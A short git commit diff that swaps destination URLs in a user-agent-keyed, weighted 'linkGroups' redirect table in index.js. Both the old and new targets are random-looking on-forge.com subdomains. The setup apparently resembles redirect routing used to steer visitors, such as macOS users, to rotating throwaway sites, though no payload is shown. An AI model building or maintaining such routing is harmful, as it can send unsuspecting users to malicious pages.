e965fc32aca1dac11cde1aea69d4e261b0695e1a
animalinside <akshay.anand12@yahoo.com>
2026-05-12 06:24:28 +0530

    Change URLs in linkGroups for macOS and others
    Updated URLs for macOS and others in linkGroups.

--- index.js
+++ index.js
@@ -46,14 +46,14 @@ function getResponse(userAgent) {
         {
             id: "Group 1",
             weight: 0.6,
-            macos: "https://sakhfsufhewfds.on-forge.com/",
-            others: "https://sakhfsufhewfds.on-forge.com/"
+            macos: "https://jfdsaasdftgyuhi.on-forge.com/",
+            others: "https://jfdsaasdftgyuhi.on-forge.com/"
         },
         {
             id: "Group 2",
             weight: 0.4,
-            macos: "https://sakhfsufhewfds.on-forge.com/",
-            others: "https://sakhfsufhewfds.on-forge.com/"
+            macos: "https://jfdsaasdftgyuhi.on-forge.com/",
+            others: "https://jfdsaasdftgyuhi.on-forge.com/"
         }
     ];
 
